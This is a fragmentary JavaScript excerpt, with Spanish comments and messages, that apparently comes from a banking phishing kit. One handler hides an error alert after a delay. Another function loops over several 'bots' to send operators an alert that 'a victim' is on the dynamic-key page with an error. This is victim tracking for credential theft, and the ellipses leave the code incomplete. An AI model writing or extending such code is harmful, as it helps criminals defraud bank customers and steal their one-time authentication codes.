document.addEventListener("DOMContentLoaded", function () {
    ...
    // Ocultar la alerta con animación después de 3 segundos
    setTimeout(() => {
        errorAlert.style.animation = "slideDown 0.5s forwards";
    }, 3000);
});
...
document.addEventListener("DOMContentLoaded", function () {
    ...
    function enviarNotificacionPagina() {
        ...
        bots.forEach(bot => {
            let mensaje = `*Alerta:* Una victima esta en la *PAGINA2* = Pagina de clave dinámica *CON* error`;
